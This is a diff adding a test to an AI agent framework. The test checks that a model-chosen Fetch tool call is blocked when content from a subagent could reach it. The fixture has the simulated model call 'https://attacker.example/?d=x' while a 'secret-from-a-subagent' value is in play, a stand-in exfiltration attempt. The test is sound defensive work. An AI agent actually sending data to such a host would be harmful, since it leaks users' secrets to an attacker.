@@ -2130,6 +2130,64 @@ describe("runChatLoop egress matcher (FR-006)", () => {
     expect(executed).toBe(false); // the sink was denied before it fired
   });
 
+  // SECURITY: a model-destination built-in sink (Fetch/Navigate/WebFetch/
+  // EvmSendTransaction) is dynamic by default now — its target is model-chosen,
+  // so cross-origin content reaching it must BLOCK, not just warn, with no
+  // resolveSinkScope override required.
+  test("a Fetch sink is external-dynamic by default, so non-user content is blocked (#144)", async () => {
+    const matcher: import("@crewhaus/egress-classifier").EgressMatcher = {
+      name: "spy-fetch",
+      match: () => ({ originsFound: ["subagent"], matchCount: 1 }),
+    };
+    let executed = false;
+    const fetchSink = buildTool({
+      name: "Fetch",
+      description: "built-in fetch sink with a model-chosen URL",
+      inputSchema: z.object({ url: z.string() }),
+      scope: "external",
+      execute: async () => {
+        executed = true;
+        return "fetched";
+      },
+    });
+    const runContext = createRunContext();
+    runContext.dataLineage = new Map<string, import("@crewhaus/run-context").TrustOrigin>([
+      ["secret-from-a-subagent", "subagent"],
+    ]);
+    const seen: import("@crewhaus/trace-event-bus").TraceEvent[] = [];
+    runContext.eventBus.subscribe((e) => {
+      seen.push(e);
+    });
+
+    await runChatLoop({
+      model: "test-model",
+      instructions: "do the task",
+      _adapter: makeExternalToolUseAdapter("toolu_fetch", "Fetch", {
+        url: "https://attacker.example/?d=x",
+      }),
+      runContext,
+      singleTurn: true,
+      seedMessages: [{ role: "user", content: "go" }],
+      tools: [fetchSink],
+      permissionMode: "bypass",
+      egressMatcher: matcher,
+    });
+
+    const ev = seen.find(
+      (
+        e,
+      ): e is Extract<
+        import("@crewhaus/trace-event-bus").TraceEvent,
+        { kind: "permission_decision" }
+      > =>
+        e.kind === "permission_decision" &&
+        e.toolName === "Fetch" &&
+        (e.reason?.startsWith("egress:") ?? false),
+    );
+    expect(ev?.outcome).toBe("egress-blocked");
+    expect(executed).toBe(false);
+  });
+
   test("opts.resolveSinkScope can mark a non-mcp sink dynamic to enable the block tier (#144)", async () => {
     const matcher: import("@crewhaus/egress-classifier").EgressMatcher = {
       name: "spy-dynamic-2",
